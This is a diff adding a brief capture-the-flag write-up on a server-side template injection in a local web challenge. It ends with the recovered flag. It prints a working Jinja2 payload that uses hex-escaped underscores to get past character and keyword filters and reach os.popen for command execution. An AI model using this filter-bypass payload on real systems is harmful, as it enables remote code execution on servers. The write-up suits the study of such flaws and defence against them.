@@ -1,0 +1,15 @@
+When user tries to access some non-existent page, he sees that application tells him that page doesn't exists and prints the url. 
+So, user input from url appears in server output.
+
+If he tries "http://localhost:5000/{{7*7}}", it will result in "http://localhost:5000/49" in output.
+
+Application has some filters, so it doesn't allow characters like: "_", ".", "[", "]". And also words: "self", "shell".
+
+In order to bypass it user has to create payload like the following:
+
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}")
+
+Exploit is uploaded next to this file.
+
+Flag:
+flag{74k1n6_ph070_0f_4_5un537_l1k3_4_c0upl3_0f_y34r5_460}
